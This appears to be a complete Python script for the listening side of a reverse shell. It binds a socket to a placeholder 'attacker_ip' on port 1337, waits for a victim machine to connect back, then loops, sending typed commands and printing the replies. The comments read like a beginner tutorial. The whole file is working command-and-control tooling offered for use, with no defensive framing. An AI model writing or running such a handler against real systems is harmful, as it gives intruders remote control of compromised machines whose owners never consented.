import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

## create loop that will iterate continuously
while True:
	inp = input(">> ")
	## convert the input string into bytes and decoded
	connection.send(bytes(inp, "utf-8"))
	
	## server machine should also receive information same as client
	recv = connection.recv(2048)
	print(recv.decode("utf-8"))
